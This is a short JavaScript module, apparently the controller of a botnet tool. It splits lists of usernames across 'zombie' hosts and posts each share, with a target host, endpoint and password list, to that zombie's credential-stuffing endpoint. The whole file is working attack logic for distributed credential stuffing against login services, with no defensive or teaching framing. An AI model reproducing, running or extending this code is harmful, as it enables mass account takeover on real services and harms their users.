const axios = require("axios");

const runCredentialStuffingAttack = (data, zombies) => {
    let { host, endpoint, delay, usernames, passwords } = data;
    let usernamesPerZombie = Math.floor(usernames.length / zombies.length);
    if (usernamesPerZombie === 0) {
        usernamesPerZombie = 1;
    }

    zombies.forEach((zombie, i) => {
        let usernameCount = 0;
        let zombieUsernames = [];
        //create array of usernames for this zombie to use
        while (usernameCount < usernamesPerZombie && usernames.length > 0) {
            zombieUsernames.push(usernames.pop());
            usernameCount += 1;
        }
        if (i === zombies.length - 1 && usernames.length > 0) {
            while (usernames.length > 0) {
                zombieUsernames.push(usernames.pop());
            }
        }

        //only send the request if there are usernames
        if (zombieUsernames.length > 0) {
            const data = {
                host,
                endpoint,
                delay,
                usernames: zombieUsernames,
                passwords: passwords,
            };
            axios
                .post(`${zombie}/credential-stuffing`, JSON.stringify(data), {
                    headers: {
                        "Content-Type": "application/json",
                    },
                })
                .then((res) => {

                    // console.log(res);
                })
                .catch((err) => {
                    console.error(err);
                });
        }
    });
};

module.exports = {
    runCredentialStuffingAttack
}